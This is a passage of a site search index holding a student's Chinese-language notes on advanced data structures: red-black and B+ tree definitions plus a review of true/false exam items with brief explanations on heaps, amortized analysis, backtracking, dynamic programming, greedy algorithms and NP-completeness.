\u53d8\u8272\u4e3a\u9ed1\u8272\uff0c\u518d\u5bf9\u8282\u70b9 p \u8fdb\u884c\u4e00\u6b21\u5de6\u65cb\u5b8c\u6210\u8c03\u6574</p> <p></p> \u5220\u9664\u5b9e\u4f8b Delete 3, Delete 17, Delete 8 <p></p> <p>Numbers Of Rotations\uff1a</p> AVL Red-Black Tree Insertion \\(\\le 2\\) \\(\\le 2\\) Deletion \\(O(\\log N)\\) \\(\\le 3\\) <pre><code>typedef enum { red, black } colors;\ntypedef struct RBNode *PtrToRBNode;\nstruct RBNode{\n    int Data;\n    PtrToRBNode Left, Right, Parent;\n    int BlackHeight;\n    colors Color;\n};\ntypedef PtrToRBNode RBTree;\n</code></pre>"},{"location":"Courses/DS/ADS/Red-Black%20Trees%20%26%20B%2B%20Trees/#b","title":"B+ \u6811","text":"<p>\u4e00\u4e2a Order M \u7684 B+ \u6811\u5b9a\u4e49\u5982\u4e0b\uff1a</p> <ul> <li>\u6839\u8282\u70b9\u8981\u4e48\u662f\u53f6\u8282\u70b9\uff0c\u8981\u4e48\u6709 2 \u5230 \\(M\\) \u4e2a\u5b50\u8282\u70b9</li> <li>\u6240\u6709\u9664\u4e86\u6839\u8282\u70b9\u7684\u975e\u53f6\u8282\u70b9\u90fd\u6709 \\(\\lceil \\frac{M}{2} \\rceil\\) \u5230 \\(M\\) \u4e2a\u5b50\u8282\u70b9</li> <li>\u6240\u6709\u53f6\u8282\u70b9\u6df1\u5ea6\u76f8\u540c</li> </ul> <p>\u5b9e\u9645\u4e0a\uff0c\u6240\u6709\u6570\u636e\u90fd\u5b58\u50a8\u5728\u53f6\u8282\u70b9\u91cc</p> <p></p> <ul> <li>A 2-3 tree with 3 nonleaf nodes must have 18 keys at most. (T)<ul> <li>\u4e00\u4e2a\u975e\u53f6\u8282\u70b9\u4e3a\u6839\u8282\u70b9\uff0c\u5176\u4f59\u4e24\u4e2a\u8282\u70b9\u6700\u591a\u6709 2*3=6 \u4e2a\u53f6\u8282\u70b9\u5b69\u5b50\uff1b\u4e00\u4e2a\u53f6\u5b50\u5b58\u653e 3 \u4e2a key\uff0c\u4e00\u5171 18 \u4e2a</li> </ul> </li> </ul> <p>B+ Tree \u7684\u63d2\u5165\u5982\u4e0b\uff1a</p> <p></p> <p>\u5bf9\u4e8e\u53f6\u5b50\u8282\u70b9\uff0c\u6700\u591a\u53ef\u4ee5\u5b58 M \u4e2a Key\uff1b\u5bf9\u4e8e\u5185\u8282\u70b9\uff0c\u6700\u591a\u53ef\u4ee5\u5b58 M-1 \u4e2a Key</p> <p>\u4ee5 2,3 \u6811\u7684\u63d2\u5165\u4e3a\u4f8b\uff0c\u5176\u4e3b\u8981\u601d\u8def\u6982\u62ec\u5982\u4e0b\uff1a</p> <p>\uff081\uff09\u4e0e\u5185\u90e8\u8282\u70b9\u6240\u5b58\u952e\u503c\u6bd4\u8f83\uff0c\u627e\u5230\u5408\u9002\u53f6\u8282\u70b9\u63d2\u5165</p> <p>\uff082\uff09\u5982\u679c\u63d2\u5165\u540e\u8be5\u8282\u70b9\u952e\u6570\u4e0d\u8d85\u8fc73\uff0c\u5219\u63d2\u5165\u7ed3\u675f\uff1b\u82e5\u8d85\u8fc7\uff0c\u7ee7\u7eed\uff083\uff09\u8fdb\u884c\u8c03\u6574</p> <p>\uff083\uff09\u5c064\u4e2a\u952e\u503c\u6309\u5927\u5c0f\u5206\u4e3a\u4e24\u4e2a\u8282\u70b9\uff0c\u5e76\u4e3a\u5b83\u4eec\u7684\u7236\u8282\u70b9\u589e\u52a0\u4e00\u4e2a\u952e\u503c</p> <p>\uff084\uff09\u5982\u679c\u7236\u8282\u70b9\u589e\u52a0\u65b0\u952e\u503c\u540e\u952e\u6570\u4e0d\u8d85\u8fc72\uff0c\u5219\u63d2\u5165\u7ed3\u675f\uff1b\u82e5\u8d85\u8fc7\uff0c\u5219\u7ee7\u7eed\uff085\uff09\u8fdb\u884c\u8c03\u6574</p> <p>\uff085\uff09\u5c06\u8be5\u8282\u70b9\u5206\u4e3a\u4e24\u4e2a\u8282\u70b9\uff0c\u5de6\u8282\u70b9\u7ee7\u627f <code>key[0]</code>\uff0c\u53f3\u8282\u70b9\u7ee7\u627f <code>key[2]</code>\uff0c<code>key[1]</code>\u4f5c\u4e3a\u65b0\u7684\u952e\u503c\u4f20\u9012\u7ed9\u7236\u8282\u70b9\uff0c\u56de\u5230\u6b65\u9aa4\uff084\uff09</p> <p>Delete</p> <p>\u5220\u9664\u540e\u53f6\u8282\u70b9\u5185 key \u6570\u91cf\u4e0d\u6ee1\u8db3\u8981\u6c42\u7684\u8bdd\uff0c\u9996\u5148\u770b\u770b\u80fd\u4e0d\u80fd\u4ece\u65c1\u8fb9\u8282\u70b9\u83b7\u5f97 key\uff1b\u82e5\u65c1\u8fb9\u8282\u70b9\u5931\u53bb key \u540e\u6570\u91cf\u4e5f\u4f1a\u5c11\u4e8e \\(\\frac{M}{2}\\) \u7684\u8bdd\uff0c\u5c06\u8fd9\u4e24\u4e2a\u8282\u70b9\u5408\u5e76\uff1b\u8fdb\u884c\u9012\u5f52\u64cd\u4f5c\u3002</p>"},{"location":"Courses/DS/ADS/Review/","title":"Review","text":""},{"location":"Courses/DS/ADS/Review/#test-oriented-review","title":"Test-Oriented Review","text":"<p> \u7ea6 4744 \u4e2a\u5b57  15 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 24 \u5206\u949f</p> <p>Quote</p> <ul> <li>Full Tree: \u6240\u6709\u8282\u70b9\u8981\u4e48\u6709\u4e24\u4e2a\u5b69\u5b50\uff0c\u8981\u4e48\u6ca1\u6709\u5b69\u5b50</li> <li>Complete Tree: \u9664\u6700\u540e\u4e00\u5c42\u5916\u90fd\u88ab\u5b8c\u5168\u586b\u5145\uff0c\u5e76\u4e14\u6700\u540e\u4e00\u5c42\u5411\u5de6\u5bf9\u9f50</li> </ul>"},{"location":"Courses/DS/ADS/Review/#avl-trees-splay-tree","title":"AVL Trees &amp; Splay Tree","text":"<ul> <li>(T) Finding the maximum key from a splay tree will result in a tree with its root having no right subtree.<ul> <li>\u4e00\u76f4\u5728 Zig-zig</li> </ul> </li> <li>Delete a node\u00a0v\u00a0from an AVL tree\u00a0T\u200b1\u200b\u200b, we can obtain another AVL tree\u00a0T\u200b2\u200b\u200b. Then insert\u00a0v\u00a0into\u00a0T\u200b2\u200b\u200b, we can obtain another AVL tree\u00a0T\u200b3\u200b\u200b. Which statement is true?<ul> <li>[T] If\u00a0v\u00a0is a leaf node in\u00a0T\u200b1\u200b\u200b, then\u00a0T\u200b1\u200b\u200b\u00a0and\u00a0T\u200b3\u200b\u200b\u00a0might be different.</li> <li>[F] If\u00a0v\u00a0is not a leaf node in\u00a0T\u200b1\u200b\u200b, then\u00a0T\u200b1\u200b\u200b\u00a0and\u00a0T\u200b3\u200b\u200b\u00a0must be different.</li> <li>[F] If\u00a0v\u00a0is not a leaf node in\u00a0T\u200b1\u200b\u200b, then\u00a0T\u200b1\u200b\u200b\u00a0and\u00a0T\u200b3\u200b\u200b\u00a0must be the same.</li> </ul> </li> <li>(F) There exists an AVL tree of depth (the depth of the root is 0) 6 and 31 nodes.<ul> <li>\u78b0\u5230\u8fd9\u9898\u76f4\u63a5\u62ff\u6700\u5c11\u8282\u70b9\u6570\u516c\u5f0f\u7b97\uff0c\\(n_6 =33 &gt; 31\\)</li> <li>\u4e0d\u8fc7\u4e5f\u8981\u6ce8\u610f\u5b9a\u4e49\uff0c\u6709\u4e9b\u9898\u4f1a\u5b9a\u4e49 root \u7684\u6df1\u5ea6\u4e3a 1</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#red-black-tree","title":"Red-Black Tree","text":"<ul> <li>(F) In a red-black tree, the number of internal nodes in the subtree rooted at\u00a0x\u00a0is no more than\u00a02\u200bbh(x)\u200b\u200b\u22121\u00a0where\u00a0bh(x)\u00a0is the black-height of\u00a0x.<ul> <li>Lemma 1: A red-black tree with n internal nodes has height at most \\(2\\log (n+1)\\)<ul> <li>\\(h\\le 2\\log (N+1)\\)</li> </ul> </li> <li>Lemma 2: The subtree rooted at any node x contains at least \\(2^{bh(x)}-1\\) internal nodes<ul> <li>\\(sizeof(x) \\ge 2^{bh(x})-1\\) \u5168\u9ed1\u8282\u70b9\u65f6\u53d6\u7b49</li> </ul> </li> <li>Lemma 3: \\(bh(x) \\ge \\frac{1}{2}h(x)\\)</li> </ul> </li> <li>(T) In a red-black tree, the number of rotations in the DELETE operation is O(1).<ul> <li>\u8be6\u89c1\u7ea2\u9ed1\u6811\u7ae0\u8282\u67d0\u8868\u683c\uff0c\u9664\u4e86AVL\u6570\u7684\u5220\u9664\u6240\u9700\u65cb\u8f6c\u6570\u4e3a \\(O(\\log N)\\)\uff0c\u5176\u5b83\u5747\u4e3a \\(O(1)\\)</li> </ul> </li> <li>(F) In a Red-Black tree, the path from the root to the nearest leaf is no more than half as long as the path from the root to the farthest leaf.<ul> <li>\u6ca1\u6709\u8fd9\u4e2a\u8bf4\u6cd5</li> </ul> </li> <li>(F) \u5224\u65ad\u4e0b\u9762\u8fd9\u4e2a BST \u662f\u5426\u662f\u7ea2\u9ed1\u6811<ul> <li></li> <li>\u7ea2\u9ed1\u6811\u4e2d\u5ea6\u4e3a 1 \u7684\u8282\u70b9\u53ea\u53ef\u80fd\u662f\u9ed1\u8272\u7684\uff01\uff01\uff01</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#b-tree","title":"B+ Tree","text":"<ul> <li>A B+ tree of order 3 with 21 numbers has at least __ nodes of degree 2.<ul> <li>\u7b54\u6848\u5927\u6982\u662f 0 \u4e2a\u3002\u4e00\u79cd\u5178\u578b\u9519\u8bef\u601d\u8003\u662f\u8ba4\u4e3a\u6700\u5c11\u60c5\u51b5\u662f\u6709 \\(21/3=7\\) \u4e2a\u53f6\u8282\u70b9\uff0c\u8fd9\u6837\u7b2c\u4e8c\u5c42\u5206\u4e3a \\(3,2,2\\) \uff0c\u5171\u4e24\u4e2a\u5ea6\u4e3a2\u7684\u8282\u70b9\u3002\u4f46\u662f\u5b9e\u9645\u4e0a\u53f6\u8282\u70b9\u6570\u91cf\u53ef\u4ee5\u5927\u4e8e 7\uff0c\u56e0\u6b64\u6211\u4eec\u5927\u624b\u8c03\u63a7\u4e00\u4e0b\u4f7f\u5176\u6709 9 \u4e2a\u53f6\u8282\u70b9\uff0c\u8fd9\u6837\u4e00\u4e2a\u5ea6\u4e3a2\u7684\u8282\u70b9\u90fd\u4e0d\u5b58\u5728\u4e86</li> </ul> </li> <li>(F) For a B+ tree with order M and N keys, the time complexity of find operations is \\(O(\\log_M N)\\)<ul> <li>\u4e0d\u8003\u8651 M \u7684\u8bdd\u5e94\u8be5\u662f \\(O(\\log N)\\) \uff0c\u8003\u8651\u7684\u8bdd\u53ef\u80fd \\(O(M\\log_MN)\\) \uff1f\u641e\u4e0d\u61c2</li> </ul> </li> <li>(T) The time bound of the FIND operation in a B+ tree containing \\(N\\) numbers is \\(O(\\log N)\\), no matter what the degree of the tree is<ul> <li>\u8fd9\u4e2a\u5c31\u662f\u5bf9\u7684</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#leftist-heap-skew-heap","title":"Leftist Heap &amp; Skew Heap","text":"<ul> <li>(T) The right path of a skew heap can be arbitrarily long.<ul> <li>\u659c\u5806\u5e76\u6ca1\u6709\u5de6\u504f\u5806\u8fd9\u4e48\u4e25\u683c\u7684\u9650\u5236</li> </ul> </li> <li>Which one of the following statements is TRUE?<ul> <li>[T] The relationship of skew heaps to leftist heaps is analogous to the relation between splay trees and AVL trees</li> <li>[F] For leftist heaps and skew heaps, the worst-case running time of a single insertion are both\u00a0O(N)<ul> <li>\u5de6\u503e\u5806\u63d2\u5165\u6700\u574f\u65f6\u95f4\u590d\u6742\u5ea6\u4ecd\u4e3a \\(O(\\log N)\\)\uff0c\u800c\u659c\u5806\u786e\u5b9e\u4e3a \\(O(N)\\)</li> </ul> </li> <li>[F] With the same operations, the resulting skew heap is always more balanced than the leftist heap<ul> <li>\u5012\u53cd\u5929\u7f61</li> <li>\u53cd\u8fc7\u6765\u8bf4\u8c8c\u4f3c\u4e5f\u662f\u9519\u8bef\u7684\uff0c\u603b\u4e4b\u4e0d\u80fd\u8fd9\u4e48\u7edd\u5bf9</li> </ul> </li> </ul> </li> <li>(T) A perfectly balanced tree forms if keys 1 to\u00a0\\(2^k-1\\)\u00a0are inserted in order into an initally empty leftist heap.<ul> <li>\u6539\u6210 Skew Heap \u4e5f\u662f\u5bf9\u7684</li> </ul> </li> <li>(T) For a skew heap with N nodes, the worst-case running time of all operations (insert/delete min/merge) is \\(O(N)\\).<ul> <li>\u659c\u5806\u7684\u5408\u5e76\u590d\u6742\u5ea6 \\(O(\\log N)\\) \u5176\u5b9e\u662f\u5747\u644a\u51fa\u6765\u7684\uff0c\u5728\u4e0d\u8003\u8651\u5747\u644a\u7684\u60c5\u51b5\u4e0b\uff0c\u5176\u65f6\u95f4\u590d\u6742\u5ea6\u53ef\u4ee5\u8fbe\u5230 \\(O(N)\\)</li> </ul> </li> <li>(T) A leftist heap with the null path length of the root being \\(r\\) must have at least \\(2^{r+1}-1\\) nodes<ul> <li>NPL = r \u5bf9\u5e94\u7740\u53f3\u8def\u5f84\u4e0a\u6709 \\(r+1\\) \u4e2a\u8282\u70b9\uff0c\u6240\u4ee5\u6b63\u786e\u3002</li> </ul> </li> <li>(F) By definition, for a light node\u00a0\\(p\\)\u00a0in a skew heap, the number of descendants of\u00a0\\(p\\)'s right subtree is no more than 1/2 of the number of descendants of\u00a0\\(p\\).<ul> <li>\u521a\u597d\u7b49\u4e8e\u7684\u60c5\u51b5\u5c5e\u4e8e\u91cd\u8282\u70b9\uff0c\u56e0\u6b64\u8fd9\u91cc\u8981\u7528 less than</li> </ul> </li> <li>(F) After merging two leftist heaps H1 and H2, the NPL of the resulted heap will be no more than min(NPL of H1, NPL of H2)+1<ul> <li>\u5b9e\u9645\u4e0a\uff0c\u5408\u5e76\u540e\u7684 NPL \u5e94\u8be5\u7b49\u4e8e \\(\\max[NPL(H_1), NPL(H_2)] (+1)\\)</li> </ul> </li> <li>(T) When a leftist heap can be implemented recursively, its counterpart skew heap may not be.</li> </ul>"},{"location":"Courses/DS/ADS/Review/#binomial-queue","title":"Binomial Queue","text":"<ul> <li>(F) To implement a binomial queue, the subtrees of a binomial tree are linked in increasing sizes<ul> <li>\u4e0d\u9700\u8981</li> </ul> </li> <li>(T) Inserting a node into a binomial heap with 9 nodes costs less time than inserting a number into a binomial heap with 15 nodes.<ul> <li>9 = 1001; 15 = 1111. \u770b\u8c01\u7684 0 \u5728\u524d\u9762</li> </ul> </li> <li>(T) Making \\(N\\) insertions into an initially empty binomial queue take \\(O(N)\\) time in worst case.<ul> <li>\u8bb0\u7b54\u6848\u5427\uff0c\u53e6\u5916\u8fd9\u4e5f\u8bf4\u660e\u5e73\u5747\u63d2\u5165\u65f6\u95f4\u662f\u5e38\u6570\u7ea7\u7684</li> </ul> </li> <li>[D] In a binomial queue, we denote that the total numbers of the nodes at even depth and odd depth as \\(N_1\\) and \\(N_2\\)(the root is at depth 0), then which of the following statement is FALSE?<ul> <li>A. If \\(N_1 \\gt N_2\\), then \\(N_1 +N_2\\) can be even</li> <li>B. If \\(N_1 +N_2\\) is odd, then \\(N_1 \\gt N_2\\)</li> <li>C. For all cases, \\(N_1 \\ge N_2\\)</li> <li>D. For all cases, \\(N_1 \\le N_2 +1\\)</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#amortized-analysis","title":"Amortized Analysis","text":"<ul> <li>\u6709\u4e24\u4e2a\u6808\u7ec4\u6210\u4e00\u4e2a\u7279\u6b8a\u961f\u5217\uff0c\u5f53\u6267\u884c <code>enqueue</code> \u65f6\uff0c\u5c06\u5143\u7d20 \\(x\\) \u538b\u5165 <code>SA</code> \uff1b\u5f53\u6267\u884c <code>dequeue</code> \u65f6\uff0c\u82e5 <code>SB</code> \u6808\u9876\u6709\u5143\u7d20\uff0c\u5219 <code>pop</code> \u5b83\uff0c\u82e5\u6ca1\u6709\uff0c\u5219\u4e0d\u65ad <code>pop SA</code> \u5e76 <code>push</code> \u8fdb <code>SB</code> \u4e2d\u3002\u5047\u8bbe <code>pop, push</code> \u90fd\u6709\u6700\u574f\u590d\u6742\u5ea6 \\(O(1)\\) \uff0c\u6c42\u5747\u644a\u5206\u6790\u52bf\u80fd\u51fd\u6570\u3002<ul> <li>\u6d88\u8017\u6700\u5927\u7684\u64cd\u4f5c\u663e\u7136\u5c31\u662f <code>pop</code> \u65f6 <code>SB</code> \u4e3a\u7a7a\uff0c\u6b64\u65f6\u5c06 <code>SA</code> \u6240\u6709\u5143\u7d20\u90fd <code>pop,push</code> \u4e86\u4e00\u904d\u3002\u56e0\u6b64\u52bf\u80fd\u51fd\u6570\u4e3a \\(2|SA|\\)\u3002</li> </ul> </li> <li>(F) In amortized analysis, a good potential function should always assume its maximum at the start of the sequence.<ul> <li>\u5e94\u8be5\u662f Minimum\uff0c\u5373 \\(\\Phi(D_0)\\) \u4e3a\u6700\u5c0f\u503c\uff0c\u901a\u5e38\u8bbe\u4e3a \\(\\Phi(D_0) =0\\)</li> </ul> </li> <li>(T) Amortized analysis is a technique to provide an upper bound on the actual cost of a sequence of operations<ul> <li>\u644a\u8fd8\u590d\u6742\u5ea6\u5e94\u8be5\u662f\u4ecb\u4e8e\u6700\u574f\u65f6\u95f4\u548c\u5e73\u5747\u65f6\u95f4\u4e4b\u95f4\u7684\uff0c\u4e0d\u8fc7\u8fd9\u9898\u90fd\u8bf4\u4e86\u662f\u5b9e\u9645\u6d88\u8017\u7684\u4e0a\u754c\u90a3\u5c31\u662f\u5427</li> </ul> </li> <li>(T) Recall that the worst-case time complexities of insertions and deletions in a heap of size N are both O(logN). Then, without changing the data structure, the amortized time complexity of insertions in a heap is also O(logN), and that of deletions is O(1).<ul> <li>\u5220\u9664\u644a\u8fd8\u590d\u6742\u5ea6\u600e\u4e48\u4f1a\u662f \\(O(1)\\)...</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#inverted-file-index","title":"Inverted File Index","text":"<ul> <li>(T) While accessing a term by hashing in an inverted file index, range searches are expensive<ul> <li>\u54c8\u5e0c\u8868\u5728\u8303\u56f4\u67e5\u8be2\u65f6\u9700\u8981\u8ba1\u7b97\u6bcf\u4e2a\u5355\u8bcd\u7684\u54c8\u5e0c\u503c\uff0c\u56e0\u6b64\u6d88\u8017\u8f83\u5927</li> </ul> </li> <li>(T) Stemming increases recall while harming precision.<ul> <li>\u4f60\u8bf4\u662f\u5c31\u662f\u5427\uff0c\u4e8c\u8005\u4e0d\u53ef\u5f97\u517c</li> </ul> </li> <li>(F) In a search engine, thresholding for document searches according to some percentage of the query terms.<ul> <li>\u80cc\u7b54\u6848</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#backtracking","title":"Backtracking","text":"<ul> <li>(T) In backtracking, if different solution spaces have different sizes, start testing from the partial solution with the smallest space size would have a better chance to reduce the time cost<ul> <li>\u4ece\u641c\u7d22\u7a7a\u95f4\u5c0f\u7684\u90e8\u5206\u5f00\u59cb\u8ba1\u7b97\uff0c\u5982\u679c\u627e\u5230\u7ed3\u679c\u4e86\u5219\u4ee5\u6700\u5c0f\u7684\u6d88\u8017\u5b8c\u6210</li> </ul> </li> <li>Given the following game tree, node\u00a0d\u00a0will be pruned with\u00a0\u03b1\u2212\u03b2\u00a0pruning algorithm if and only if _____.<ul> <li></li> <li>\\(65\\le b \\le 70\\) (\u5fd8\u8bb0\u4ece\u54ea\u770b\u6765\u7684\u4e86\uff0c\u6211\u611f\u89c9 \\(65\\le b\\) \u5373\u53ef)</li> </ul> </li> <li>(T) For the Turnpike reconstruction algorithm of\u00a0\\(N\\)\u00a0points, assuming that the distance set\u00a0\\(D\\)\u00a0is maintained as an AVL tree, the running time is\u00a0\\(O(N^2\\log\u2061 N)\\)\u00a0if no backtracking happens.<ul> <li>\u4e0d\u662f\u5f88\u7406\u89e3\u8fd9\u4e2a\uff0c\u8fd8\u662f\u8bb0\u7b54\u6848\u5427</li> </ul> </li> <li>(T) There are many solutions to the 5-Queens Problem, and there are\u00a08\u00a0solutions that at least one queen is placed in a corner of the chessboard.<ul> <li>\u8fd8\u662f\u8bb0\u7b54\u6848\u9632\u6b62\u8003\u5230\u539f\u9898\uff01</li> </ul> </li> <li>(T) The 4-queen problem has exactly 2 distinct solutions.<ul> <li>\u56db\u7687\u540e\u95ee\u9898\u53ea\u6709\u4e24\u4e2a\u89e3\uff01\u8bb0\u4f4f\u5b83</li> </ul> </li> <li>(F) What makes the time complexity analysis of a backtracking algorithm very difficult is that the time taken to backtrack -- that is, to recover the previous state of a solution -- is hard to estimate.<ul> <li>\u6062\u590d\u72b6\u6001\u8fd9\u4e00\u6b65\u9aa4\u5e76\u975e\u6700\u8017\u65f6\u7684\uff0c\u5e94\u8be5\u662f\u9012\u5f52\u641c\u7d22\u6216\u8005\u526a\u679d</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#divide-conquer","title":"Divide &amp; Conquer","text":"<ul> <li>[D] We can perform BuildHeap for leftist heaps by considering each element as a one-node leftist heap, placing all these heaps on a queue, and performing the following step: Until only one heap is on the queue, dequeue two heaps, merge them, and enqueue the result. Which one of the following statements is FALSE?<ul> <li></li> <li>\u5408\u5e76\u5806\u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(\\log N)\\)\uff0c\u5f97\u5230\u9012\u63a8\u8868\u8fbe\u5f0f \\(T(N) = 2T\\left(\\frac{N}{2}\\right)+O(\\log N)\\)\u3002\u6839\u636e\u4e3b\u5b9a\u7406\u53ef\u4ee5\u5f97\u51fa\u603b\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N)\\)</li> <li>\u4e5f\u53ef\u8bb0\u4f4f\u7ed3\u8bba\uff0c\u6240\u6709\u5806\u7684\u5efa\u5806\u64cd\u4f5c\u90fd\u4e0d\u4f1a\u8d85\u8fc7 \\(O(N)\\)</li> </ul> </li> <li>(T) The\u00a0n-th Fibonacci number can be computed by divide and conquer method of computing\u00a0\\(x^n\\), where\u00a0x\u00a0is the matrix  \\(\\left [\\begin{matrix}0 &amp; 1 \\\\ 1 &amp; 1 \\end{matrix}\\right ]\\) . Then the\u00a0\\(n^3\\)-th Fibonacci number\u00a0\\(F_{n^3}\\)\u200b\u00a0can be computed in\u00a0\\(O(\\log n)\\)\u00a0time.<ul> <li>\u770b\u4e0d\u61c2\u55b5\uff0c\u8bb0\u7b54\u6848\u5427</li> </ul> </li> </ul> <p>\u8ba1\u7b97\u4e0b\u9762\u51fd\u6570\u7684\u65f6\u95f4\u590d\u6742\u5ea6\uff0c\u5176\u4e2d <code>calc</code> \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(1)\\) :</p> <pre><code>void fun(int l, int r) {\n    if(r-l+1&lt;=1234) return;\n    int m=(l+r)/2;\n    int m1=(l+m)/2, m2=(m+1+r)/2;\n    fun(l, m);\n    fun(m1+1, m2);\n\n    for(int k=1;k&lt;=r-l+1;k++)\n        for(int i=1;i&lt;=r-l+1;i++)\n            for(int j=l;j&lt;=r;j+=i)\n                calc(j, i);\n\n    fun(m+1, r);\n    fun(m1+1, m2);\n}\n</code></pre> <p>\u89e3\u7b54\uff1a \u56db\u4e2a <code>fun</code> \u5d4c\u5957\u8c03\u7528\u5bf9\u5e94 \\(4T(N / 2)\\) \uff0c\u4e3b\u8981\u8003\u8651\u4e2d\u95f4\u7684\u5faa\u73af\u90e8\u5206\u3002\u5916\u9762\u4e24\u5c42\u5faa\u73af\u90fd\u662f \\(N\\) \u6b21\uff0c\u6700\u5185\u4fa7\u5faa\u73af \\(N/ i\\) \u6b21\uff0c\u5176\u4e2d \\(i\\) \u4ece 1 \u5230 \\(N\\) \u3002\u7531\u4e8e \\(1+ \\frac{1}{2}+ \\frac{1}{3}+ ... + \\frac{1}{N} = \\ln N\\) \uff0c\u6240\u4ee5 combine \u7684\u65f6\u95f4\u590d\u6742\u5ea6\u4e3a \\(O(N^2 \\log N)\\)</p> \\[ T(N) = 4T\\left(\\frac{ N}{ 2} \\right)+ O(N^2 \\log N) = O(N^2 \\log ^2 N) \\]"},{"location":"Courses/DS/ADS/Review/#dynamic-programming","title":"Dynamic Programming","text":"<ul> <li>(F) If a problem can be solved by dynamic programming, it must be solved in polynomial time.<ul> <li>\u80cc\u5305\u95ee\u9898\u53ef\u4ee5\u7528 DP \u6c42\u89e3\uff0c\u4f46\u7531\u4e8e\u8f93\u5165\u7684\u6570\u636e\u4e0d\u662f\u591a\u9879\u5f0f\u7684\uff0c\u590d\u6742\u5ea6\u4e5f\u4e0d\u662f\u591a\u9879\u5f0f</li> </ul> </li> <li>(T) To solve a problem by dynamic programming instead of recursions, the key approach is to store the results of computations for the subproblems so that we only have to compute each different subproblem once. Those solutions can be stored in an array or a hash table.<ul> <li>\u8003\u7684\u662f DP \u7b97\u6cd5\u7684\u4e24\u4e2a\u57fa\u672c\u601d\u60f3</li> </ul> </li> <li>\u8003\u8651 DP \u72b6\u6001\u8f6c\u79fb\u65b9\u7a0b\u8ba1\u7b97\u987a\u5e8f\uff1a<ul> <li></li> <li>\u5bf9\u4e8e \\(f_{i,j,k}=f_{i,j+1,k}+\\min (...)\\) \uff0c\\(j\\) \u7684\u9012\u5f52\u8981\u4ece\u5927\u5230\u5c0f\u8ba1\u7b97 <code>for j in n to 0:</code></li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#greedy-algorithm","title":"Greedy Algorithm","text":"<ul> <li>(F) Let S be the set of activities in Activity Selection Problem. Then the earliest finish activity \\(a_m\\) must be included in all the maximum-size subset of mutually compatible activities of S.<ul> <li>\u867d\u7136\u7b97\u6cd5\u7684\u601d\u60f3\u662f\u5c40\u90e8\u9009\u62e9\u7ed3\u675f\u6700\u65e9\u7684\u6d3b\u52a8\uff0c\u4f46\u662f\u5982\u679c\u6709\u53e6\u4e00\u4e2a\u6d3b\u52a8\u7a0d\u665a\u4e00\u70b9\u7ed3\u675f\uff0c\u4f46\u662f\u53c8\u6ca1\u5728\u4e0b\u4e00\u4e2a\u6d3b\u52a8\u5f00\u59cb\u540e\u624d\u7ed3\u675f\uff0c\u90a3\u4e48\u9009\u62e9\u8fd9\u4e2a\u6d3b\u52a8\u4f5c\u4e3a\u66ff\u4ee3\u4e5f\u662f\u6700\u4f18\u89e3</li> </ul> </li> <li>[C] Which of the following is NOT an elment of greedy strategy?<ul> <li>A. optimal substructure</li> <li>B. works only if the local optimum is equal to the global optimum<ul> <li>\u53ea\u6709\u5c40\u90e8\u6700\u4f18\u89e3\u5bfc\u5411\u5168\u5c40\u6700\u4f18\u89e3\u624d\u6709\u6548</li> </ul> </li> <li>C. overlapping sub-problems<ul> <li>\u91cd\u53e0\u5b50\u95ee\u9898\u662f\u52a8\u6001\u89c4\u5212\u7684\u7279\u5f81</li> </ul> </li> <li>D. make a choice before solving the remaining sub-problem<ul> <li>\u5728\u6c42\u89e3\u4e4b\u524d\u4f5c\u51fa\u9009\u62e9</li> </ul> </li> </ul> </li> <li>(F) The Huffman code is one kind of optimal prefix codes. For a given alphabet and its characters' frequencies\uff0cthe Huffman codes may not be unique, but the Huffman code\u00a0length\u00a0of each character is unique.<ul> <li>\u8003\u8651\u7279\u4f8b\uff0c\u5982\u679c\u5b58\u5728\u591a\u4e2a\u8282\u70b9\u6743\u91cd\u76f8\u540c\uff0c\u90a3\u4e48\u5b83\u4eec\u7684\u7f16\u7801\u957f\u5ea6\u53ef\u80fd\u5c31\u4e0d\u4e00\u6837</li> </ul> </li> </ul>"},{"location":"Courses/DS/ADS/Review/#np-completion","title":"NP-Completion","text":"<ul> <li>(T) A decision problem in P is also in both NP and co-NP.<ul> <li>\\(co-NP\\) \u8868\u793a\u5176\u8865\u96c6\u8bed\u8a00\u53ef\u5728 NP \u5185\u9a8c\u8bc1</li> </ul> </li> <li>(T) The following problem is in co-NP: Given a positive integer k, is k a prime number?</li> <li>(F) Given that problem A is NP-complete. If problem B is in NP and can be polynomially reduced to problem A, then problem B is NP-complete.<ul> <li>\u5e94\u8be5\u662f A \u80fd\u5f52\u7ea6\u5230 B\uff0c\u624d\u80fd\u8bf4 B \u662f NPC \u95ee\u9898</li> </ul> </li> <li>(T) If \\(L_1 \\le _p L_2\\) and \\(L_2\\in NP\\) , then \\(L_1 \\in NP\\)<ul> <li>\\(L_1\\) \u53ef\u4ee5\u591a\u9879\u5f0f\u5f52\u7ea6\u81f3 \\(L_2\\) \uff0c\u4e5f\u80fd\u591f\u8bf4\u660e \\(L_1\\) \u80fd\u591f\u5728\u975e\u786e\u5b9a\u56fe\u7075\u673a\u4e0a\u4ee5\u591a\u9879\u5f0f\u65f6\u95f4\u89e3\u51b3\u3002\\(L_1\\) \u53ef\u80fd\u662f \\(P\\) \u95ee\u9898\uff0c\u4f46\u662f \\(P\\in NP\\)</li> </ul> </li> <li>(F) If a decision problem A can be reduced to B, then it means that problem A is strictly easier than B in terms of computational complexity.<ul> <li>\u5e76\u975e\u4e25\u683c\u66f4\u7b80\u5355\uff0c\u53ef\u80fd\u76f8\u7b49(\u6bd4\u5982\u90fd\u662f NPC \u95ee\u9898)</li> </ul> </li> <li>(F) All the languages can be decided by a non-deterministic machine.<ul> <li>\u8fd8\u6709\u4e0d\u53ef\u5224\u5b9a\u95ee\u9898\uff0c\u6bd4\u5982 Halting Problem</li> </ul> </li> <li>(F) If a problem can be solved by dynamic programming, it must be solved in polynomial 